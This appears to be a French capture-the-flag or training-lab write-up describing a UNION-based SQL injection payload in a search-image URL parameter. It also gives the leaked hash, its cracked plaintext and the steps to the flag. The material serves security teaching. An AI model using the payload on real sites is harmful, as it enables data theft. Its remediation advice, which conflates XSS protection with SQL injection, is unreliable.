# README : Exploit de SQL Injection avec Search Image

## Description

Cette brèche met en évidence une vulnérabilité dans la gestion des paramètres d'URL d'une application web. Elle permet à un attaquant potentiel d'exécuter des commandes SQL malveillantes pour accéder à des informations sensibles sur le serveur et de les déchiffrer ultérieurement.

## Fonctionnement

- Accédez à la page : `http://X.X.X.X/index.php?page=searchimg`
- Utilisez une injection SQL dans l'URL: "1 or 1=1 UNION select comment, title FROM list_images"
- On a alors une reponse avec une instruction et un mdp crypte.

```txt
Title: Hack me ?
Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

- Utilisez un outil de déchiffrement MD5 comme https://www.dcode.fr/md5-hash pour décrypter cette valeur
- Le résultat du déchiffrement est : albatroz
- Puis string to sha256 : https://www.dcode.fr/sha256-hash pour avoir le flag.

## Impact

Cette vulnérabilité peut permettre à un attaquant de :

- Accéder aux données sensibles du système de base de données
- Déchiffrer des mots de passe utilisateur ou d'autres informations sensibles
- Potentiellement exposer des données confidentielles

## Recommandations

Pour corriger cette vulnérabilité :

- Valider et sécuriser tous les paramètres d'URL côté serveur avant de les utiliser ou de les interpréter.
- Utiliser une validation robuste pour empêcher l'exécution de code malveillant dans les paramètres URL.
- Implémenter une protection anti-XSS pour éviter l'exécution de commandes SQL dans le navigateur.
